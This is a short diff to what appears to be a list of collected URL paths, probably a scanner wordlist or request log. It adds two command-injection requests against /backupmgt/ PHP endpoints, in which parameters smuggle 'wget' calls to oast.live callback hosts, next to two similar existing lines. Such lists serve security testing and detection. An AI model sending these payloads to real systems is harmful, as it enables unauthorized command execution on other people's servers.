@@ -23851,3 +23851,5 @@ m.naver.com:443
 /figs-loso-gold-figs-30-50-cm?order=ASC&sort=p.sort_order&tag=30-50
 /backupmgt/localJob.php?session=fail;wget+http://d0m448i93sf15f65rb5gne1qcdmxbqdwg.oast.live;
 /backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d0m448i93sf15f65rb5gm7i3shkoa8qzw.oast.live;
+/backupmgt/localJob.php?session=fail;wget+http://d0m448i93sf15f65rb5gdhk9pzkpfyed3.oast.live;
+/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d0m448i93sf15f65rb5gzxu5ubqsenf63.oast.live;
